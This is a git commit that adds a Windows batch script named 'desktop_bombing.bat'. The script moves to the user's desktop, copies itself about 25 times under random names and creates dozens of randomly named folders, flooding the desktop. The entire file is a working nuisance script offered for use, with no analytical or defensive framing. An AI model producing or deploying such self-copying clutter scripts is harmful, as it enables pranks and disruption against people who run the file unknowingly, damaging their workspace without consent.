89c250f0965fa112db0b3785e5fd91c6488bebdb
Baki Enes Yalçın <82122237+bakienes@users.noreply.github.com>
2021-04-08 01:45:26 +0300

    desktop_bombing.bat

---
+++ desktop_bombing.bat
@@ -0,0 +1,91 @@
+@echo off
+cd %userprofile%\desktop
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+copy %0 %random%.%random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+
